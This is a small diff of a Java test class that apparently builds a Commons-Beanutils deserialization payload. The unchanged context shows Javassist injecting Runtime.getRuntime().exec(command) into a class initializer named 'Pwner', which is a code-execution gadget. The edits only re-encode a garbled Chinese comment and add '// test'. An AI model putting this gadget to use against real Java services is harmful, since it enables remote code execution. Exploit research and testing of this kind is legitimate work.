@@ -46,7 +46,7 @@ public class CommonsBeanutilsCollectionsLogging1PayloadTest {
 		//System.out.println(angelwhu.model.Point.class.getName());
 		
 		cc.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") +"\");");
-		//¼ÓÈë¹Ø¼üÖ´ĞĞ´úÂë£¬Éú³ÉÒ»¸ö¾²Ì¬º¯Êı¡£
+		//åŠ å…¥å…³é”®æ‰§è¡Œä»£ç ï¼Œç”Ÿæˆä¸€ä¸ªé™æ€å‡½æ•°ã€‚
 		
 		String newClassNameString = "angelwhu.Pwner" + System.nanoTime();
 		cc.setName(newClassNameString);
@@ -58,6 +58,7 @@ public class CommonsBeanutilsCollectionsLogging1PayloadTest {
 		
 //		final byte[] classBytes = cc.toBytecode();
 //		System.out.println(classBytes);
+		// test
 	}
 	
 	@Test
